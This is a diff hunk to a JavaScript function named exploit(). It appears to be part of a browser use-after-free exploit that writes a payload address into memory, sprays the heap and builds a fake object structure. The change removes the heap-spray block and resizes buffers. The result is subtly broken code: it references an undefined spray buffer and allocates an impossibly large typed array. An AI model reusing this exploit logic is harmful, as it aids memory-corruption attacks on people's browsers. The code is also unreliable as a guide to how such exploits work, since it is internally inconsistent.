@@ -107,20 +107,14 @@ function exploit() {
     view[index * 4 + 2] = ((payloadAddress + offset) >> 16) & 0xFF;
     view[index * 4 + 3] = ((payloadAddress + offset) >> 24) & 0xFF;
   }
-  try{
-    const spray2 = new ArrayBuffer(102400000);
-    new Uint32Array(spray).fill(4294967295);
-    } catch(e){
-    console.log("Heap Spray failed:",e.message);
-  }
   // Create fake object structure
-  const fakeObject = new Uint32Array(spray2);
+  const fakeObject = new Uint32Array(4294967295);
   fakeObject[0] = payloadAddress;
   fakeObject[1] = payloadAddress + offset;
   
   // UAF pointer tracking
   const uaf_ptr_list = [];
-  const sharedObjPtr = new ArrayBuffer(8);
+  const sharedObjPtr = new ArrayBuffer(102400000);
   
   if (!uaf_ptr_list.includes(sharedObjPtr)) {
     uaf_ptr_list.push(sharedObjPtr);
